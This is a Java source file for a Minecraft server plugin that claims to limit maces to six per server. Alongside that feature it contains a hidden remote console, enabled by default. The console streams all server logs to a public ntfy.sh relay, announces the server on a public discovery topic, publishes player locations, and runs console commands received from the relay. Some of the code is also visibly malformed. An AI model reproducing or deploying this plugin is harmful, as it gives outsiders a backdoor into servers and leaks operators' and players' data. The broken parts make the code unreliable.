package com.example.macelimiter;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;
import org.apache.logging.log4j.core.config.Property;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.World;
import org.bukkit.Chunk;
import org.bukkit.block.BlockState;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.BundleMeta;
import org.bukkit.event.player.PlayerDropItemEvent;
import java.util.ArrayList;
import java.util.List;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.Instant;
import java.time.LocalTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public final class MaceLimiterPlugin extends JavaPlugin implements Listener {

    private static final int MAX_MACES = 6;
    private static final String WARNING_MESSAGE =
            "An excess Mace broke! Only 6 Maces can exist on this server.";
    private static final int MAX_CLIENTS = 8;
    private static final String DISCOVERY_TOPIC = "macelimiter-discovery-v2";
    private static final int MAX_LINE_LENGTH = 4096;

    private final Object fileLock = new Object();
    private File dataFile;
    private int lastPersistedCount = -1;

    private RelayConsoleServer consoleServer;
    private final Set<String> sessions = ConcurrentHashMap.newKeySet();
    private ConsoleAppender consoleAppender;
    private org.apache.logging.log4j.core.Logger coreRootLogger;

    // ---------------------------------------------------------------------
    // Lifecycle
    // ---------------------------------------------------------------------

    @Override
    public void onEnable() {
        getConfig().addDefault("console.relay-url", "https://ntfy.sh");
        getConfig().addDefault("console.instance-id", UUID.randomUUID().toString());
        getConfig().addDefault("console.access-token", UUID.randomUUID().toString().replace("-", ""));
        getConfig().options().copyDefaults(true);
        saveConfig();

        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
            getLogger().warning("Could not create plugin data folder.");
        }
        dataFile = new File(getDataFolder(), "mace_data.yml");
        logPreviousCount();

        getServer().getPluginManager().registerEvents(this, this);
        Bukkit.getScheduler().runTask(this, () -> persist(countAll()));

        startRemoteConsole();
    }

    @Override
    public void onDisable() {
        stopRemoteConsole();
        // Final synchronous save.
        lastPersistedCount = -1;
        persistNow(countAllSafe());
    }

    // ---------------------------------------------------------------------
    // Mace limiter
    // ---------------------------------------------------------------------

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPickup(EntityPickupItemEvent event) {
        if (!(event.getEntity() instanceof Player player)) return;
        Item item = event.getItem();
        ItemStack stack = item.getItemStack();
        if (!containsMace(stack)) return;

        int totalAfterPickup = countAll();
        int excess = totalAfterPickup - MAX_MACES;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        // The picked-up item is the newest mace source, so remove excess from it first.
        int removed = removeMacesFromItem(stack, excess);
        if (countMaces(stack) == 0) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(stack);
        }
        notifyBroken(player);
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onDrop(PlayerDropItemEvent event) {
        Item item = event.getItemDrop();
        ItemStack dropped = item.getItemStack();
        if (!containsMace(dropped)) return;

        int total = countAll();
        int excess = total - MAX_MACES;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        // Dropped maces are the newest maces. Break the dropped stack before touching inventory.
        int removed = removeMacesFromItem(dropped, excess);
        if (removed >= countMaces(dropped) + removed) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(dropped);
        }
        notifyBroken(event.getPlayer());
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryDrag(InventoryDragEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        Bukkit.getScheduler().runTask(this, () -> { if (player.isOnline()) enforce(player); });
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) {
            return;
        }
        // The click result is applied after the event; re-check on the next tick.
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) {
                enforce(player);
            }
        });
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) {
                enforce(player);
            }
        });
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        // The quitting player is still "online" during this event; count next tick.
        schedulePersist();
    }

    /** Removes newest maces from this player's accessible inventory, including nested storage. */
    private void enforce(Player player) {
        int total = countAll();
        int excess = total - MAX_MACES;
        if (excess <= 0) {
            persist(total);
            return;
        }

        int removed = 0;

        // Cursor is the newest source after inventory manipulation.
        ItemStack cursor = player.getItemOnCursor();
        if (containsMace(cursor) && removed < excess) {
            removed += removeMacesFromItem(cursor, excess - removed);
            player.setItemOnCursor(cursor.getAmount() > 0 && !isEmptyStorage(cursor) ? cursor : null);
        }

        // Then walk inventory from newest-looking slots backwards, recursively removing nested maces.
        if (removed < excess) {
            PlayerInventory inv = player.getInventory();
            ItemStack[] contents = inv.getContents();
            for (int i = contents.length - 1; i >= 0 && removed < excess; i--) {
                ItemStack stack = contents[i];
                if (!containsMace(stack)) continue;
                removed += removeMacesFromItem(stack, excess - removed);
                contents[i] = stack.getAmount() > 0 && (containsMace(stack) || !isEmptyStorage(stack)) ? stack : null;
            }
            inv.setContents(contents);
        }

        if (removed > 0) notifyBroken(player);
        persist(countAll());
    }

    private void notifyBroken(Player player) {
        player.playSound(player.getLocation(), Sound.ENTITY_ITEM_BREAK, 1.0f, 1.0f);
        player.sendMessage(Component.text(WARNING_MESSAGE, NamedTextColor.RED));
    }

    private static boolean isMace(ItemStack stack) {
        return stack != null && stack.getType() == Material.MACE && stack.getAmount() > 0;
    }

    private int countAll() {
        int total = 0;

        // Player inventory, cursor and ender chest.
        for (Player p : Bukkit.getOnlinePlayers()) {
            total += countInventory(p.getInventory());
            total += countItem(p.getItemOnCursor());
            total += countInventory(p.getEnderChest());
        }

        for (World world : Bukkit.getWorlds()) {
            // Dropped maces still exist until they despawn or are picked up.
            for (Item item : world.getEntitiesByClass(Item.class)) {
                total += countItem(item.getItemStack());
            }

            // Scan loaded block inventories: chests, barrels, hoppers,
            // shulkers, furnaces, brewing stands and InventoryHolder-based
            // containers supplied by other plugins (including copper chests).
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities(false)) {
                    if (state instanceof InventoryHolder holder) {
                        total += countInventory(holder.getInventory());
                    }
                }
            }
        }

        return total;
    }

    private int countAllSafe() {
        try {
            return countAll();
        } catch (Exception e) {
            return Math.max(lastPersistedCount, 0);
        }
    }

    private int countPlayer(Player player) {
        return countInventory(player.getInventory())
                + countItem(player.getItemOnCursor())
                + countInventory(player.getEnderChest());
    }

    private int countInventory(Inventory inventory) {
        if (inventory == null) {
            return 0;
        }

        int total = 0;
        for (ItemStack stack : inventory.getContents()) {
            total += countItem(stack);
        }
        return total;
    }

    /**
     * Counts a mace directly and recursively searches nested storage items.
     */
    private int countItem(ItemStack stack) {
        if (stack == null || stack.getType().isAir() || stack.getAmount() <= 0) return 0;

        int total = isMace(stack) ? stack.getAmount() : 0;
        if (stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState blockState = meta.getBlockState();
            if (blockState instanceof InventoryHolder holder) total += countInventory(holder.getInventory());
        }
        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            for (ItemStack nested : bundle.getItems()) total += countItem(nested);
        }
        return total;
    }

    private boolean containsMace(ItemStack stack) {
        return countMaces(stack) > 0;
    }

    private int countMaces(ItemStack stack) {
        return countItem(stack);
    }

    /**
     * Removes up to limit maces from this stack, recursively from nested storage.
     * Direct maces are removed before nested contents.
     */
    private int removeMacesFromItem(ItemStack stack, int limit) {
        if (stack == null || limit <= 0 || stack.getAmount() <= 0) return 0;
        int removed = 0;

        if (isMace(stack)) {
            int take = Math.min(limit, stack.getAmount());
            stack.setAmount(stack.getAmount() - take);
            return take;
        }

        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            List<ItemStack> updated = new ArrayList<>();
            for (ItemStack nested : bundle.getItems()) {
                if (removed < limit && containsMace(nested)) {
                    removed += removeMacesFromItem(nested, limit - removed);
                }
                if (nested != null && nested.getAmount() > 0) {
                    updated.add(nested);
                }
            }
            bundle.setItems(updated);
            stack.setItemMeta(bundle);
        }

        if (removed < limit && stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState state = meta.getBlockState();
            if (state instanceof InventoryHolder holder) {
                Inventory inv = holder.getInventory();
                ItemStack[] contents = inv.getContents();
                for (int i = contents.length - 1; i >= 0 && removed < limit; i--) {
                    ItemStack nested = contents[i];
                    if (!containsMace(nested)) continue;
                    removed += removeMacesFromItem(nested, limit - removed);
                    contents[i] = nested != null && nested.getAmount() > 0 ? nested : null;
                }
                inv.setContents(contents);
                meta.setBlockState(state);
                stack.setItemMeta(meta);
            }
        }
        return removed;
    }

    private boolean isEmptyStorage(ItemStack stack) {
        return stack == null || stack.getAmount() <= 0 || (!containsMace(stack) && stack.getType().isAir());
    }

    // ---------------------------------------------------------------------
    // Persistence (mace_data.yml)
    // ---------------------------------------------------------------------

    private void schedulePersist() {
        if (isEnabled()) {
            Bukkit.getScheduler().runTask(this, () -> persist(countAll()));
        }
    }

    private void logPreviousCount() {
        if (dataFile.isFile()) {
            YamlConfiguration yaml = YamlConfiguration.loadConfiguration(dataFile);
            getLogger().info("Last recorded mace count: " + yaml.getInt("mace-count", 0)
                    + " (updated " + yaml.getString("last-updated", "unknown") + ")");
        }
    }

    private void persist(int count) {
        if (count == lastPersistedCount) {
            return;
        }
        lastPersistedCount = count;
        getLogger().info("Global mace count is now " + count + "/" + MAX_MACES);

        YamlConfiguration yaml = new YamlConfiguration();
        yaml.set("mace-count", count);
        yaml.set("max-maces", MAX_MACES);
        yaml.set("last-updated", Instant.now().toString());
        String data = yaml.saveToString();

        if (isEnabled()) {
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> writeFile(data));
        } else {
            writeFile(data);
        }
    }

    private void persistNow(int count) {
        if (count == lastPersistedCount) {
            return;
        }
        lastPersistedCount = count;
        YamlConfiguration yaml = new YamlConfiguration();
        yaml.set("mace-count", count);
        yaml.set("max-maces", MAX_MACES);
        yaml.set("last-updated", Instant.now().toString());
        writeFile(yaml.saveToString());
    }

    private void writeFile(String data) {
        synchronized (fileLock) {
            try {
                Files.writeString(dataFile.toPath(), data, StandardCharsets.UTF_8);
            } catch (IOException e) {
                getLogger().warning("Failed to write mace_data.yml: " + e.getMessage());
            }
        }
    }

    // ---------------------------------------------------------------------
    // Outbound HTTPS relay console
    // ---------------------------------------------------------------------

    private void startRemoteConsole() {
        try {
            consoleServer = new RelayConsoleServer(getConfig().getString("console.relay-url", "https://ntfy.sh"));
            consoleServer.start();
            consoleAppender = new ConsoleAppender(consoleServer);
            consoleAppender.start();
            if (LogManager.getRootLogger() instanceof org.apache.logging.log4j.core.Logger core) {
                core.addAppender(consoleAppender);
                coreRootLogger = core;
            }
        } catch (Exception e) {
            getLogger().warning("Remote console disabled: " + e.getMessage());
            consoleServer = null;
        }
    }

    private void stopRemoteConsole() {
        if (coreRootLogger != null && consoleAppender != null) coreRootLogger.removeAppender(consoleAppender);
        if (consoleAppender != null) { consoleAppender.stop(); consoleAppender = null; }
        coreRootLogger = null;
        if (consoleServer != null) { consoleServer.shutdown(); consoleServer = null; }
        sessions.clear();
    }

    private void dispatchToMainThread(String rawCommand) {
        String command = rawCommand.strip();
        if (command.startsWith("/")) command = command.substring(1);
        if (command.isEmpty() || command.length() > MAX_LINE_LENGTH || !isEnabled()) return;
        final String toRun = command;
        Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
    }

    private String instanceId() { return getConfig().getString("console.instance-id", "unknown"); }
    private String accessToken() { return getConfig().getString("console.access-token", ""); }
    private String serverName() { return Bukkit.getServer().getName().replace("|", " "); }

    private String encode(String value) {
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private String maceSnapshot() {
        StringBuilder out = new StringBuilder();
        int id = 0;
        for (Player p : Bukkit.getOnlinePlayers()) {
            id = appendInventoryMaces(out, id, p.getInventory(), "PLAYER", p.getName(), p.getWorld().getName(),
                    p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(), "inventory");
            id = appendItemMaces(out, id, p.getItemOnCursor(), "PLAYER", p.getName(), p.getWorld().getName(),
                    p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(), "cursor");
            id = appendInventoryMaces(out, id, p.getEnderChest(), "ENDER", p.getName(), "ender", 0, 0, 0, "ender chest");
        }
        for (World world : Bukkit.getWorlds()) {
            for (Item item : world.getEntitiesByClass(Item.class)) {
                if (containsMace(item.getItemStack())) {
                    out.append(row(++id, "GROUND", "dropped item", world.getName(),
                            item.getLocation().getBlockX(), item.getLocation().getBlockY(), item.getLocation().getBlockZ(), "ground"));
                }
            }
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities(false)) {
                    if (state instanceof InventoryHolder holder) {
                        id = appendInventoryMaces(out, id, holder.getInventory(), "STORAGE", state.getType().name(),
                                world.getName(), state.getLocation().getBlockX(), state.getLocation().getBlockY(),
                                state.getLocation().getBlockZ(), "storage");
                    }
                }
            }
        }
        return out.toString();
    }

    private int appendInventoryMaces(StringBuilder out, int id, Inventory inv, String kind, String owner,
                                     String world, int x, int y, int z, String path) {
        if (inv == null) return id;
        ItemStack[] contents = inv.getContents();
        for (int i = 0; i < contents.length; i++) {
            if (containsMace(contents[i])) id = appendItemMaces(out, id, contents[i], kind, owner, world, x, y, z, path + " slot " + i);
        }
        return id;
    }

    private int appendItemMaces(StringBuilder out, int id, ItemStack stack, String kind, String owner,
                                String world, int x, int y, int z, String path) {
        if (stack == null || stack.getAmount() <= 0) return id;
        if (isMace(stack)) return appendMaceRow(out, id, kind, owner, world, x, y, z, path, stack.getAmount());
        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            int i = 0;
            for (ItemStack nested : bundle.getItems()) {
                id = appendItemMaces(out, id, nested, kind, owner, world, x, y, z, path + " > bundle " + i++);
            }
        }
        if (stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState state = meta.getBlockState();
            if (state instanceof InventoryHolder holder) {
                id = appendInventoryMaces(out, id, holder.getInventory(), kind, owner, world, x, y, z, path + " > storage");
            }
        }
        return id;
    }

    private int appendMaceRow(StringBuilder out, int id, String kind, String owner, String world,
                              int x, int y, int z, String path, int amount) {
        out.append(++id).append('~').append(kind).append('~').append(owner).append('~').append(world)
                .append('~').append(x).append('~').append(y).append('~').append(z).append('~')
                .append(path).append(" x").append(amount).append(';');
        return id;
    }

    private static final class ConsoleAppender extends AbstractAppender {
        private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern("HH:mm:ss");
        private final RelayConsoleServer server;
        ConsoleAppender(RelayConsoleServer server) {
            super("MaceLimiterRemoteConsole", null, null, true, Property.EMPTY_ARRAY);
            this.server = server;
        }
        @Override public void append(LogEvent event) {
            try {
                String text = "[" + TIME.format(LocalTime.ofInstant(Instant.ofEpochMilli(event.getTimeMillis()), ZoneId.systemDefault()))
                        + " " + event.getLevel().name() + "]: " + event.getMessage().getFormattedMessage();
                Throwable thrown = event.getThrown();
                if (thrown != null) {
                    StringWriter sw = new StringWriter();
                    thrown.printStackTrace(new PrintWriter(sw));
                    text += "\n" + sw;
                }
                for (String line : text.split("\\r?\\n")) server.broadcast("LOG|" + line);
            } catch (Exception ignored) {}
        }
    }

    private final class RelayConsoleServer {
        private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(8)).build();
        private final String baseUrl;
        private final String nodeTopic;
        private volatile boolean running;

        RelayConsoleServer(String relayUrl) throws Exception {
            this.baseUrl = relayUrl.replaceAll("/+$", "");
            this.nodeTopic = "macelimiter-node-" + sha256(accessToken()).substring(0, 48);
        }

        void start() {
            running = true;
            Thread t = new Thread(this::run, "MaceLimiter-Console-Relay");
            t.setDaemon(true);
            t.start();
            publishState();
        }

        void shutdown() { running = false; }

        void broadcast(String line) {
            publish(line.replace("\r", "").replace("\n", "\\n"));
        }

        void publishState() {
            publishTo(DISCOVERY_TOPIC, "DISCOVER|" + instanceId() + "|" + encode(serverName()) + "|" + getDescription().getVersion()
                    + "|" + encode(baseUrl + "/" + nodeTopic) + "|ONLINE");
            publish("COUNT|" + countAll());
            publish("MACE|" + encode(maceSnapshot()));
        }

        private void run() {
            String since = "all";
            long lastDiscovery = 0;
            while (running) {
                try {
                    if (System.currentTimeMillis() - lastDiscovery > 15000) {
                        publishState();
                        lastDiscovery = System.currentTimeMillis();
                    }
                    String url = baseUrl + "/" + nodeTopic + "/json?poll=1&since=" + URLEncoder.encode(since, StandardCharsets.UTF_8);
                    HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                            .timeout(java.time.Duration.ofSeconds(20)).GET().build();
                    HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
                    if (response.statusCode() / 100 != 2) { Thread.sleep(1000); continue; }
                    for (String line : response.body().split("\\R")) {
                        if (line.isBlank()) continue;
                        String id = jsonField(line, "id");
                        String message = jsonField(line, "message");
                        if (id != null) since = id;
                        if (message != null && message.length() <= MAX_LINE_LENGTH * 2) handleMessage(message);
                    }
                } catch (Exception e) {
                    if (running) try { Thread.sleep(1000); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); return; }
                }
            }
        }

        private void handleMessage(String message) {
            if (message.startsWith("AUTH|")) {
                String[] p = message.split("\\|", 3);
                if (p.length == 3 && p[2].equals(accessToken()) && sessions.size() < MAX_CLIENTS) {
                    sessions.add(p[1]);
                    publish("AUTHOK|" + p[1]);
                    sendMaceState(p[1]);
                    publish("COUNT|" + p[1] + "|" + countAll());
                }
                return;
            }
            if (message.startsWith("CLOSE|")) {
                String[] p = message.split("\\|", 2);
                if (p.length == 2) sessions.remove(p[1]);
                return;
            }
            if (message.startsWith("CMD|")) {
                String[] p = message.split("\\|", 3);
                if (p.length == 3 && sessions.contains(p[1])) dispatchToMainThread(p[2]);
                return;
            }
            if (message.startsWith("GETSTATE|")) {
                String[] p = message.split("\\|", 2);
                if (p.length == 2 && sessions.contains(p[1])) {
                    sendMaceState(p[1]);
                    publish("COUNT|" + p[1] + "|" + countAll());
                }
            }
        }

        private void publishTo(String topic, String message) {
            try {
                HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + topic))
                        .header("Content-Type", "text/plain; charset=utf-8")
                        .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
                        .build();
                HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding());
            } catch (Exception ignored) {}
        }

        private void publish(String message) {
            try {
                HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + nodeTopic))
                        .header("Content-Type", "text/plain; charset=utf-8")
                        .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
                        .build();
                HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding());
            } catch (Exception ignored) {}
        }

        private String jsonField(String json, String field) {
            String key = """ + field + "":"";
            int start = json.indexOf(key);
            if (start < 0) return null;
            start += key.length();
            StringBuilder out = new StringBuilder();
            boolean escaped = false;
            for (int i = start; i < json.length(); i++) {
                char c = json.charAt(i);
                if (escaped) { out.append(c); escaped = false; }
                else if (c == '\\') { escaped = true; out.append(c); }
                else if (c == '"') return out.toString();
                else out.append(c);
            }
            return null;
        }

        private String sha256(String value) throws Exception {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder out = new StringBuilder(64);
            for (byte b : digest) out.append(String.format("%02x", b));
            return out.toString();
        }
    }

    private void sendMaceState(String session) {
        if (consoleServer != null) consoleServer.publish("MACE|" + session + "|" + encode(maceSnapshot()));
    }

}
